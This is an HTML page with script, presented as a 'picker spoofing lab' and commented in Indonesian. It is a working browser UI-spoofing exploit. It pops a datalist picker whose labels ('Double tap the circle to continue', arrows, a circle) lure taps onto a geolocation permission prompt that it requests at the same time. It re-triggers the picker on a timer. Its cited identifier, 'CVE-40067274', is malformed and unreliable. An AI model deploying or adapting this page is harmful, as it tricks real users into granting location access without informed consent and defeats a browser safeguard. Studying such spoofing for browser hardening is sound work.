<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Advanced Picker Spoofing Lab (CVE-40067274 Context)</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 40px;
            background-color: #121212;
            color: #e0e0e0;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            cursor: pointer;
        }
        h1 {
            color: #ff5252;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .info-box {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 15px;
            border-radius: 6px;
            max-width: 500px;
            font-size: 13px;
            color: #b0b0b0;
            margin-top: 20px;
            text-align: left;
        }
        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
    </style>
</head>
<body>

    <h1>⚠️ Tap the screen to initialize lab test</h1>
    <p style="font-size: 14px; color: #888;">Menguji siklus pemanggilan <code>showPicker()</code> dan interaksi izin asinkron.</p>

    <!-- Elemen Input & Datalist Target -->
    <input id="input" type="time" list="times" style="display:none;" />
    <datalist id="times">
        <select>
            <option label="Double tap the circle to continue">00:00</option>
            <option label="⬇️       ">00:00</option>
            <option label="⬇️       ">00:00</option>
            <option label="⬇️       ">00:00</option>
            <option label="⬇️       ">00:00</option>
            <option label="⭕      ">00:00</option>
            <option label="">00:00</option>
        </select>
    </datalist>

    <div class="info-box" id="log-box">
        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh pengguna...
    </div>

<script>
    const logBox = document.getElementById('log-box');

    function appendLog(msg) {
        console.log(msg);
        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
    }

    function showList() {
        try {
            // Memeriksa status izin geolokasi sebelum memicu picker
            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
                if (permissionStatus.state === 'granted') {
                    appendLog("Izin geolokasi sudah diberikan. Menghentikan simulasi picker.");
                    return;
                }

                // Penguatan: Mencoba memanggil showPicker() dengan penanganan eksepsi aktif
                input.showPicker();
                appendLog("Berhasil memicu input.showPicker()");
            }).catch(err => {
                appendLog("Error pada permissions query: " + err.message);
            });
        } catch (e) {
            appendLog("[DITOLAK/BLOCKED] showPicker() gagal: " + e.message);
        }
    }

    document.body.onclick = async () => {
        appendLog("Interaksi pengguna terdeteksi (User Activation sah).");
        
        // Eksekusi awal
        showList();

        // Penguatan Interval Berulang untuk menguji batas konsumsi user activation (ConsumeIfActive)
        let attempt = 1;
        const intervalId = setInterval(() => {
            appendLog(`Mencoba pemanggilan berulang ke-${attempt}`);
            showList();
            attempt++;
            
            // Batasi hingga 5 kali percobaan interval untuk analisis lab
            if (attempt > 5) {
                clearInterval(intervalId);
                appendLog("Pengujian interval selesai. Perhatikan respons konsumsi token aktivasi.");
            }
        }, 300);

        // Memicu permintaan geolokasi asinkron secara paralel
        navigator.geolocation.getCurrentPosition(
            (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
            (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
        );
    };
</script>

</body>
</html>
